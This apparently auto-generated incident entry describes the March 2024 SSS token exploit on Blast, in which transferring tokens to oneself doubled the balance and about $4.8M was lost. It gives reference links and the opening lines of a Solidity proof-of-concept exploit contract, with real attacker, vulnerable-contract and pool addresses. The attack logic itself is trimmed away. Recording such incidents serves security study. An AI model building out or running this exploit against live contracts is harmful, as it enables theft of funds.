# [?] SSS - Token Balance Doubles on Transfer to self

## Summary
Severity: Unknown
Chain: Blast
Component: SSS
Published: 2024-03-21
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/SSS_exp.sol
Type: defi-exploit-poc

## Details
Lost: 4.8M
References:
- https://twitter.com/SSS_HQ/status/1771054306520867242
- https://twitter.com/dot_pengun/status/1770989208125272481

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../basetest.sol";
import "./../interface.sol";
// @KeyInfo - Total Lost: $4.8M
// Attacker: 0x6a89a8C67B5066D59BF4D81d59f70C3976faCd0A
// Attack Contract: 0xDed85d83Bf06069c0bD5AA792234b5015D5410A9
// Vulnerable Contract: 0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed
// Attack Tx: https://blastscan.io/tx/0x62e6b906bb5aafdc57c72cd13e20a18d2de3a4a757cd2f24fde6003ce5c9f2c6

// @Analyses
// https://twitter.com/SSS_HQ/status/1771054306520867242
// https://twitter.com/dot_pengun/status/1770989208125272481

interface ISSS is IERC20 {
    function maxAmountPerTx() external view returns (uint256);
    function burn(
        uint256
    ) external;
}

contract SSSExploit is BaseTestWithBalanceLog {
    address private constant POOL = 0x92F32553cC465583d432846955198F0DDcBcafA1;
    IWETH private constant WETH = IWETH(payable(0x4300000000000000000000000000000000000004));
    ISSS private constant SSS = ISSS(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
    Uni_Router_V2 private constant ROUTER_V2 = Uni_Router_V2(0x98994a9A7a2570367554589189dC9772241650f6);
    Uni_Pair_V2 private sssPool = Uni_Pair_V2(POOL);

    uint256 ethFlashAmt = 1 ether;
    uint256 expectedETHAfter = 1393.20696066122859944 ether;

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/SSS_exp.sol_
